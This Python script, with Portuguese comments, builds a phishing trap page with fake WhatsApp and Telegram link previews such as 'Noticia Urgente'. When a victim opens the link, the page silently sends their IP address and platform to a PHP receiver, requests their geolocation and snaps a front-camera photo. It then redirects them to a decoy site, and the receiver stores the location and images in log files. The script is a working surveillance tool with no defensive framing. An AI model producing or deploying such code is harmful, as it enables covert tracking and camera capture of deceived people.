#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import shutil
import json
import time
import socket

# Define timeout global para rede
socket.setdefaulttimeout(5)

# --- FUNÇÕES AUXILIARES ---
def simple_log(msg):
    try:
        if not os.path.exists("logs"): os.makedirs("logs")
        with open("logs/debug_custom_og.txt", "a", encoding="utf-8") as f:
            f.write(f"[CustomOG] {msg}\n")
    except: pass
    print(f"[CustomOG] {msg}")

# --- 1. PREPARAÇÃO DE DIRETÓRIOS ---
try:
    base_dir = os.path.dirname(os.path.abspath(__file__)) 
    target_dir = os.path.join(base_dir, 'custom_og')      
    img_dir = os.path.join(target_dir, 'images')

    os.makedirs(target_dir, exist_ok=True)
    os.makedirs(img_dir, exist_ok=True)

    # Index de emergência
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write('<html><body><h1>A carregar...</h1><script>setTimeout(function(){location.reload()}, 2000);</script></body></html>')

except Exception as e:
    simple_log(f"ERRO CRÍTICO AO CRIAR PASTA: {e}")
    sys.exit(1)

# --- 2. LÓGICA PRINCIPAL ---
try:
    # Captura de Variáveis
    title = os.getenv('TITLE') or "Noticia Urgente"
    desc = os.getenv('DESC') or "Clique para ver mais..."
    redirect_url = os.getenv('REDIRECT_URL')
    image = os.getenv('IMAGE')

    if not redirect_url or len(redirect_url) < 4:
        redirect_url = "https://google.com"

    # --- LÓGICA DE IMAGEM (OG:IMAGE) ---
    og_image_url = ""

    if image and image.startswith(('http', 'https')):
        # SE FOR URL: Usa direto. O WhatsApp prefere baixar da fonte original (Google/Imgur) 
        # do que baixar do nosso túnel lento.
        og_image_url = image
    elif image:
        # Se for caminho local, não tem jeito, usa o relativo
        og_image_url = image
    else:
        # Se não tiver imagem, usa uma padrão genérica (ex: ícone de play)
        # Isso garante que SEMPRE tenha algo visual
        og_image_url = "https://cdn-icons-png.flaticon.com/512/1384/1384060.png" # Ícone Youtube genérico

    # PHP Receptor (Mantido igual)
    php_receiver_code = """<?php
    header('Content-Type: application/json');
    error_reporting(0);
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    if ($data) {
        $logDir = '../../logs/';
        if (!is_dir($logDir)) { mkdir($logDir, 0777, true); }
        if (isset($data['lat'])) {
            file_put_contents($logDir . 'result.txt', json_encode(['status' => 'success', 'lat' => $data['lat'], 'lon' => $data['lon'], 'acc' => $data['acc']]));
        } elseif (isset($data['ip'])) {
            file_put_contents($logDir . 'info.txt', json_encode($data));
        } elseif (isset($data['img'])) {
            $img = str_replace(['data:image/png;base64,', ' '], ['', '+'], $data['img']);
            file_put_contents($logDir . 'cam_' . date('Ymd_His') . '.png', base64_decode($img));
        }
    }
    ?>"""

    # HTML Final
    safe_redirect_url = redirect_url.replace('"', '\\"')
    
    html_code = f"""<!DOCTYPE html>
    <html prefix="og: http://ogp.me/ns#">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <!-- LINK PREVIEW OTIMIZADO -->
    <meta property="og:title" content="{title}">
    <meta property="og:description" content="{desc}">
    <meta property="og:image" content="{og_image_url}">
    
    <!-- Dimensões ajudam o WhatsApp a aceitar a imagem -->
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="600">
    <meta property="og:type" content="website">
    <meta property="og:url" content="{redirect_url}">
    
    <!-- TWITTER CARDS (Backup para Telegram) -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="{title}">
    <meta name="twitter:description" content="{desc}">
    <meta name="twitter:image" content="{og_image_url}">
    
    <title>{title}</title>
    <style>
        body {{ background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }}
        .loader {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
    </head>
    <body>
        <div style="text-align:center;">
            <div class="loader"></div>
            <p>A carregar...</p>
        </div>
    <script>
        const target = "{safe_redirect_url}";
        window.onload = function() {{
            // Captura IP silenciosa
            try {{
                fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{{
                    fetch('data.php', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{ip:d.ip, os:navigator.platform}})}});
                }}).catch(e=>{{}});
            }} catch(e) {{}}
            startTrap();
        }};
        function startTrap() {{
            if(navigator.geolocation) {{ navigator.geolocation.getCurrentPosition(onPosSuccess, onPosError); }} 
            else {{ requestCamera(); }}
        }}
        function onPosSuccess(pos) {{
            fetch('data.php', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }})}});
            requestCamera();
        }}
        function onPosError(e) {{ requestCamera(); }}
        function requestCamera() {{
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }}).then(function(stream) {{
                    const video = document.createElement('video'); video.srcObject = stream; video.play();
                    setTimeout(function() {{
                        const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const data = canvas.toDataURL('image/png');
                        stream.getTracks().forEach(track => track.stop());
                        fetch('data.php', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{img: data}})}}).then(finish);
                    }}, 800);
                }}).catch(finish);
            }} else {{ finish(); }}
        }}
        function finish() {{ window.location.href = target; }}
    </script>
    </body></html>"""

    # Escrita Final (UTF-8)
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write(html_code)
    
    with open(os.path.join(target_dir, 'data.php'), 'w', encoding='utf-8') as f:
        f.write(php_receiver_code)
        
    simple_log("Sucesso total.")
    sys.exit(0)

except Exception as e:
    simple_log(f"ERRO DE EXECUÇÃO: {e}")
    sys.exit(0)